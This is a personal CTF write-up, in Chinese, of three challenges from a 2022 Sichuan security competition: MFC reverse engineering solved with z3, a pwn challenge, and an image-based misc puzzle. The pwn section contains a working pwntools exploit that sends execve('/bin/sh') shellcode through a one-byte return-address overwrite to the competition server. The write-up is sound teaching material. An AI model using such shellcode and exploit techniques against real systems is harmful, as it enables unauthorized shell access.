# 四川省网安技能大赛2022 个人输出复盘


## [Reverse] AmazingMFC

一整场比赛Reverse就一个题，真是被看扁了啊.jpg

[附件备份](https://s1.fileditch.ch/hBPjUjXQtwKzpkuBEVPq.zip)

经典的MFC逆向，一打开十个按钮，点一下会出base64信息提示是不是正确的flag所在位置。

理论上是要一个个解密，但是我第一次点就是正确的位置，什么是欧皇啊（后仰）

所以看了一眼base64解码结果是f14g here here直接跳过这一步。

定位函数，XSPY开

```
mfc version:140, static linked?: true, debug?: false
CWnd::FromHandlePermanent = 0x0041D79C
CWnd = 0x0019FE1C
HWND: 0x000E0582
class:0019FE1C(CDialogEx,size=0xd0)
CDialogEx:CDialog:CWnd:CCmdTarget:CObject

[vtbl+0x00]GetRuntimeClass         = 0x0041A3FA(AmazingMFC.exe+ 0x01a3fa )
[vtbl+0x01]dtor                    = 0x004032C0(AmazingMFC.exe+ 0x0032c0 )
[vtbl+0x02]Serialize               = 0x00401FE0(AmazingMFC.exe+ 0x001fe0 )
[vtbl+0x03]OnCmdMsg                = 0x004136D2(AmazingMFC.exe+ 0x0136d2 )
[vtbl+0x04]OnFinalRelease          = 0x0041E602(AmazingMFC.exe+ 0x01e602 )
[vtbl+0x05]IsInvokeAllowed         = 0x00418E4A(AmazingMFC.exe+ 0x018e4a )
[vtbl+0x06]GetDispatchIID          = 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x07]GetTypeInfoCount        = 0x00407440(AmazingMFC.exe+ 0x007440 )
[vtbl+0x08]GetTypeLibCache         = 0x00407440(AmazingMFC.exe+ 0x007440 )
[vtbl+0x09]GetTypeLib              = 0x00418E42(AmazingMFC.exe+ 0x018e42 )
[vtbl+0x0A]GetMessageMap           = 0x00403310(AmazingMFC.exe+ 0x003310 )
[vtbl+0x0B]GetCommandMap           = 0x00418E18(AmazingMFC.exe+ 0x018e18 )
[vtbl+0x0C]GetDispatchMap          = 0x00418E24(AmazingMFC.exe+ 0x018e24 )
[vtbl+0x0D]GetConnectionMap        = 0x00418E1E(AmazingMFC.exe+ 0x018e1e )
[vtbl+0x0E]GetInterfaceMap         = 0x0041D9AD(AmazingMFC.exe+ 0x01d9ad )
[vtbl+0x0F]GetEventSinkMap         = 0x00418E2A(AmazingMFC.exe+ 0x018e2a )
[vtbl+0x10]OnCreateAggregates      = 0x00407F24(AmazingMFC.exe+ 0x007f24 )
[vtbl+0x11]GetInterfaceHook        = 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x12]GetExtraConnectionPoints= 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x13]GetConnectionHook       = 0x00408452(AmazingMFC.exe+ 0x008452 )

message map=0x0059DE20(AmazingMFC.exe+ 0x19de20 )
msg map entries at 0x0059DE28(AmazingMFC.exe+ 0x19de28 )
OnMsg:WM_SYSCOMMAND(0112),func= 0x00403430(AmazingMFC.exe+ 0x003430 )
OnMsg:WM_PAINT(000f),func= 0x004034E0(AmazingMFC.exe+ 0x0034e0 )
OnMsg:WM_QUERYDRAGICON(0037),func= 0x00403600(AmazingMFC.exe+ 0x003600 )
OnCommand: notifycode=0000 id=03e8,func= 0x00403620(AmazingMFC.exe+ 0x003620 )
OnCommand: notifycode=0000 id=03ea,func= 0x00403700(AmazingMFC.exe+ 0x003700 )
OnCommand: notifycode=0000 id=03eb,func= 0x004037E0(AmazingMFC.exe+ 0x0037e0 )
OnCommand: notifycode=0000 id=03f0,func= 0x004038C0(AmazingMFC.exe+ 0x0038c0 )
OnCommand: notifycode=0000 id=03f4,func= 0x004039A0(AmazingMFC.exe+ 0x0039a0 )
OnCommand: notifycode=0000 id=03ee,func= 0x00403A80(AmazingMFC.exe+ 0x003a80 )
OnCommand: notifycode=0000 id=03ef,func= 0x00403B60(AmazingMFC.exe+ 0x003b60 )
OnCommand: notifycode=0000 id=03ec,func= 0x00403C40(AmazingMFC.exe+ 0x003c40 )
OnCommand: notifycode=0000 id=03ed,func= 0x00403E80(AmazingMFC.exe+ 0x003e80 ) //flag位置
OnCommand: notifycode=0000 id=03f6,func= 0x00404060(AmazingMFC.exe+ 0x004060 )
```

查一下对应按钮的id是03ed，对应的handle函数在`0x403E80`处

```c
int __thiscall sub_403E80(CWnd *this)
{
  CWnd *DlgItem; // eax
  int v2; // eax
  int v3; // ecx
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  int v7; // [esp+Ch] [ebp-118h]
  int v8; // [esp+10h] [ebp-114h]
  char v10[208]; // [esp+18h] [ebp-10Ch] BYREF
  char v11[8]; // [esp+E8h] [ebp-3Ch] BYREF
  int v12; // [esp+F0h] [ebp-34h] BYREF
  uint8_t BeingDebugged; // [esp+F7h] [ebp-2Dh]
  char Source[28]; // [esp+F8h] [ebp-2Ch] BYREF
  int v15; // [esp+120h] [ebp-4h]

  DlgItem = CWnd::GetDlgItem(this, -1);
  CWnd::SetWindowTextA(DlgItem, "RjE0ZyBoZXJlIGhlcmU=");
  strcpy(Source, "CFTDSA|6470*\"c*a6eaa>2fz");
  sub_401C40(0xD8u);
  sub_4045A0(0);
  v15 = 0;
  CDialog::DoModal((CDialog *)v10);
  sub_404300(v11);
  v8 = std::_Ptr_base<_EXCEPTION_RECORD const>::get((char *)this + 208); //这里是check对话框传入的8位数
  v7 = sub_403D20(v8);
  BeingDebugged = 0;
  BeingDebugged = NtCurrentPeb()->BeingDebugged;
  if ( v7 != -239077030 || BeingDebugged )
  {
    v5 = (const CHAR *)std::_Ptr_base<_EXCEPTION_RECORD const>::get((char *)this + 208);
    CWnd::MessageBoxA(this, v5, "Oops", 0);
  }
  else
  {
    v2 = std::_Ptr_base<_EXCEPTION_RECORD const>::get((char *)this + 208);
    *((_DWORD *)this + 53) = sub_548134(v3, v2);
    sub_401C40(4u);
    sub_401FF0(&v12);
    LOBYTE(v15) = 1;
    sub_403E30(Source);
    sub_402E40((int)&v12, Source, *((_DWORD *)this + 53));
    v4 = (const CHAR *)std::_Ptr_base<_EXCEPTION_RECORD const>::get(&v12);
    CWnd::MessageBoxA(this, v4, "Oops", 0);
    LOBYTE(v15) = 0;
    sub_4030C0(&v12);
  }
  v15 = -1;
  return sub_404660();
}
```

点了按钮之后是一个对话框，提示输入8 digits然后有一个check按钮，还是XSPY看一下信息

```
mfc version:140, static linked?: true, debug?: false
CWnd::FromHandlePermanent = 0x0041D79C
CWnd = 0x0019F4D4
HWND: 0x001B0624
class:0019F4D4(Check,size=0xd8)
Check:CDialogEx:CDialog:CWnd:CCmdTarget:CObject

[vtbl+0x00]GetRuntimeClass         = 0x00404590(AmazingMFC.exe+ 0x004590 )
[vtbl+0x01]dtor                    = 0x00404610(AmazingMFC.exe+ 0x004610 )
[vtbl+0x02]Serialize               = 0x00401FE0(AmazingMFC.exe+ 0x001fe0 )
[vtbl+0x03]OnCmdMsg                = 0x004136D2(AmazingMFC.exe+ 0x0136d2 )
[vtbl+0x04]OnFinalRelease          = 0x0041E602(AmazingMFC.exe+ 0x01e602 )
[vtbl+0x05]IsInvokeAllowed         = 0x00418E4A(AmazingMFC.exe+ 0x018e4a )
[vtbl+0x06]GetDispatchIID          = 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x07]GetTypeInfoCount        = 0x00407440(AmazingMFC.exe+ 0x007440 )
[vtbl+0x08]GetTypeLibCache         = 0x00407440(AmazingMFC.exe+ 0x007440 )
[vtbl+0x09]GetTypeLib              = 0x00418E42(AmazingMFC.exe+ 0x018e42 )
[vtbl+0x0A]GetMessageMap           = 0x00404690(AmazingMFC.exe+ 0x004690 )
[vtbl+0x0B]GetCommandMap           = 0x00418E18(AmazingMFC.exe+ 0x018e18 )
[vtbl+0x0C]GetDispatchMap          = 0x00418E24(AmazingMFC.exe+ 0x018e24 )
[vtbl+0x0D]GetConnectionMap        = 0x00418E1E(AmazingMFC.exe+ 0x018e1e )
[vtbl+0x0E]GetInterfaceMap         = 0x0041D9AD(AmazingMFC.exe+ 0x01d9ad )
[vtbl+0x0F]GetEventSinkMap         = 0x00418E2A(AmazingMFC.exe+ 0x018e2a )
[vtbl+0x10]OnCreateAggregates      = 0x00407F24(AmazingMFC.exe+ 0x007f24 )
[vtbl+0x11]GetInterfaceHook        = 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x12]GetExtraConnectionPoints= 0x00408452(AmazingMFC.exe+ 0x008452 )
[vtbl+0x13]GetConnectionHook       = 0x00408452(AmazingMFC.exe+ 0x008452 )

message map=0x0059E2B8(AmazingMFC.exe+ 0x19e2b8 )
msg map entries at 0x0059E2C0(AmazingMFC.exe+ 0x19e2c0 )
OnCommand: notifycode=0000 id=03e8,func= 0x004046B0(AmazingMFC.exe+ 0x0046b0 ) //Check位置
```

按下check之后的handle函数在`0x4046B0`，看一下是这个样子

```c
void __thiscall sub_4046B0(CDialog *this)
{
  CWnd::GetDlgItemTextA(1001, (int)this + 208);
  CDialog::EndDialog(this, 0);
}
```

看出是把输入的东西传入this+208处。由于是在同一个对象内的数据，在sub_403E80处找一下对this+208位置参数的引用，可以发现核心代码在`sub_403D20`处

```
.text:00403D20 sub_403D20      proc near               ; CODE XREF: fl4g_is_here+BE↓p
.text:00403D20
.text:00403D20 var_18          = dword ptr -18h
.text:00403D20
.text:00403D20                 push    ebp
.text:00403D21                 mov     ebp, esp
.text:00403D23                 sub     esp, 0Ch
.text:00403D26                 push    ebx
.text:00403D27                 push    esi
.text:00403D28                 push    edi
.text:00403D29                 call    loc_403D2F
.text:00403D29 ; ---------------------------------------------------------------------------
.text:00403D2E                 db 84h
.text:00403D2F ; ---------------------------------------------------------------------------
.text:00403D2F
.text:00403D2F loc_403D2F:                             ; CODE XREF: sub_403D20+9↑j
.text:00403D2F                 db      36h
.text:00403D2F                 add     [esp+18h+var_18], 8
.text:00403D34                 retn
.text:00403D34 sub_403D20      endp ; sp-analysis failed
.text:00403D34
.text:00403D35
.text:00403D35 ; =============== S U B R O U T I N E =======================================
.text:00403D35
.text:00403D35
.text:00403D35 ; int __usercall sub_403D35@<eax>(int _EBP@<ebp>)
.text:00403D35 sub_403D35      proc near
.text:00403D35                 repne mov dword ptr [ebp-4], 2537h
```

反编译失败了（这里`0x403D35`是我自己按的创建函数，其实没有识别出来）

看到有一个奇怪的call，call里是一个把栈上的什么东西+8的操作，结合下面的东西猜一下被修改的是栈上保存的 retaddr 返回地址，+8之后在retn时直接跳转到call处地址加8字节的位置 也就是`0x403D35`处继续执行。

F5 一下大概是下面这个逻辑

```c
int __cdecl sub_403D20(unsigned __int8 *a1)
{
  int v2; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  for ( i = 0x2537; ; i = v2 + 33 * i )
  {
    v2 = *a1++;
    if ( !v2 )
      break;
  }
  return i;
}
```

写z3解一下。密文在前面的函数里。

```python
from z3 import *

X = [ BitVec("x%s" %i, 32) for i in range(8)]
S = Solver()
for i in range(8):
   S.add(X[i] >= ord('0'))
   S.add(X[i] <= ord('9'))

v3 = 0x2537
for i in range(8):
   v3 = (v3*33 + X[i]) & 0xFFFFFFFF
S.add(v3 == 0xF1BFF95A )

print(S.check())
print(S.model())
```

不觉得很酷吗，这么短的脚本我写挂了3遍

得到想让我们输入的8位数字，直接在程序里输入得到flag。

## [Pwn] ezpwn

其实根本没有想过我能在正式比赛里真的写出pwn题，呜呜呜呜呜呜呜呜呜呜呜呜。

[附件备份](https://s1.fileditch.ch/LMvziShKURELoDLZvWBS.zip)

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```



```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD v4[18]; // [rsp+20h] [rbp-110h] BYREF
  __int64 v5; // [rsp+68h] [rbp-C8h]
  char v6[176]; // [rsp+70h] [rbp-C0h] BYREF
  _DWORD v7[2]; // [rsp+120h] [rbp-10h] BYREF
  const char *v8; // [rsp+128h] [rbp-8h]

  strcpy((char *)v4, "U2FsdGVkX18KkUGt505/bwBwg2VoFZCtD3dq2ZpUGbZ48Xkw3E/6Z7WuwE7yZL2G");
  BYTE1(v4[16]) = 0;
  HIWORD(v4[16]) = 0;
  v4[17] = 0;
  v5 = 0LL;
  memset(v6, 0, sizeof(v6));
  sub_81A(v7, a2, v6);
  fprintf(stderr, "%s\n", "Wow!");
  fprintf(stderr, "%s\n", "Do u know what's is it?");
  sub_885();
  v7[1] = 1;
  v8 = (const char *)sub_8D8(v4);
  fprintf(stderr, "%s\n", v8);
  return 0LL;
}
```

```c
ssize_t sub_885()
{
  __int64 buf[5]; // [rsp+0h] [rbp-30h] BYREF
  int v2; // [rsp+2Ch] [rbp-4h]

  memset(buf, 0, sizeof(buf));
  v2 = 1;
  return read(0, buf, 0x39uLL);
}
```

简单逻辑，输入一个字符串。这里看了一下栈上的空间，其实有栈溢出但是只能覆盖到返回地址的最后一个字节。

有PIE，没有NX，有RWX段，应该是一个ret2shellcode。

其实这里main里的ida F5漏了一个地方：

```
.text:0000000000000B29                 call    sub_885
.text:0000000000000B2E                 mov     [rbp+var_C], 1
.text:0000000000000B35                 cmp     [rbp+var_C], 0
.text:0000000000000B39                 jz      short loc_B50
.text:0000000000000B3B                 lea     rax, [rbp+var_110]
.text:0000000000000B42                 mov     rdi, rax
.text:0000000000000B45                 call    sub_8D8
.text:0000000000000B4A                 mov     [rbp+var_8], rax
.text:0000000000000B4E                 jmp     short loc_B52
.text:0000000000000B50 ; ---------------------------------------------------------------------------
.text:0000000000000B50
.text:0000000000000B50 loc_B50:                                ; CODE XREF: main+137↑j
.text:0000000000000B50                 jmp     rbx
.text:0000000000000B52 ; ---------------------------------------------------------------------------
.text:0000000000000B52
.text:0000000000000B52 loc_B52:                                ; CODE XREF: main+14C↑j
.text:0000000000000B52                 mov     rax, cs:stderr
```

这个位置有一个`jmp rbx`，但是在正常的程序执行里是无法到达的。

正常的返回地址是`0x????????B2E`，由于PIE保护不会将最后两个字节随机化，所以可以直接利用栈溢出把返回地址的最后一个字节覆盖成0x50达到执行到`jmp rbx`的目的。

本来以为要先leak栈地址然后想办法控制rbx寄存器使其指向栈上写的shellcode，但是实际实验的时候发现这个题里面rbx已经帮我们设置好了。
直接往栈上写shellcode然后溢出即可。

```python
from pwn import *
context.arch = "amd64"
context.log_level = 'debug'
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
extralen = 0x39 - len(payload)
payload += b"P" * extralen #P == 0x50
print(payload)
p = remote("tcp.cloud.dasctf.com", 22873)
p.recvuntil(b"it?\n")
p.sendline(payload)
p.interactive()
```

紧张刺激地在比赛结束前3min打通了，shellcode换了三四个，鉴定为急了。

## [Misc] 钢琴块

```py
from PIL import Image
import os
i = 1
while i <= 160:
	x = 0
	for j in range(8):
		img = Image.open(f"game/{i+j}.png").convert("L")
		if img.getpixel((0, 0)) == 255:
			x = (x << 1) | 1
		else:
			x = (x << 1)
	print(chr(x), end="")
	i += 8

i = 1
while i <= 160:
	x = 0
	for j in range(8):
		img = Image.open(f"game/{i+j}.png").convert("L")
		stt = os.stat(f"game/{i+j}.png")
		q = stt.st_size
		if img.getpixel((0, 0)) == 255:
			if q != 336:
				x = (x << 1) | 1
			else:
				x = (x << 1)
		else:
			if q == 150:
				x = (x << 1) | 1
			else:
				x = (x << 1)
	print(chr(x), end="")
	i += 8
```

烂活题，没有复盘价值，就这样。

